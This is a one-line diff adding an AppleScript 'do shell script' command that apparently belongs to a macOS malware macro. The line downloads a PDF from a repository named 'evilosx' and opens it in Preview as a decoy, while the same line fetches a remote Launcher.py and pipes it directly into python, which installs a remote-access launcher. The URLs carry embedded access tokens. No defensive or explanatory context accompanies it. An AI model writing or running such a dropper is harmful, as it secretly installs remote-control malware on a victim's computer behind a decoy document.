@@ -1,0 +1,1 @@
+do shell script "curl -s https://raw.githubusercontent.com/LoganOneal/evilosx/master/macros/functions.pdf?token=AUW-R5n4iEERCxdZDBd3o4HwEYz8bFV4ks5b1L4rwA%3D%3D | open -f -a Preview.app & curl -s https://raw.githubusercontent.com/LoganOneal/evilosx/master/builds/Launcher.py?token=AUW-R2RrAq49gDs89ZpZYV3F3cqbfdY1ks5b1L9YwA%3D%3D | python -"
